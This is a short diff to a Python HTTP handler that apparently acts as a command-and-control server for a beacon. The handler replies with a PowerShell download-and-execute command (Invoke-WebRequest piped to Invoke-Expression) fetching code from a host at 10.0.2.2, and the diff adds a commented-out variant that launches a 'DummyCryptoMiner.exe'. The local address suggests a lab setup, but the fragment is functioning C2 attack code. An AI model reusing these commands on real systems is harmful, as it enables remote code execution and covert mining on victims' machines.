@@ -50,6 +50,7 @@ class CustomHandler(SimpleHTTPRequestHandler):
 
         # Single command sent to C2 Beacon
         response_content = r'''Invoke-WebRequest -Uri "http://10.0.2.2:8080/ratata" | Invoke-Expression'''
+        # response_content = r'''Invoke-WebRequest -Uri "http://10.0.2.2:8080/ratata" | & ./DummyCryptoMiner.exe'''
         ###########################
 
         self.wfile.write(response_content.encode('utf-8'))
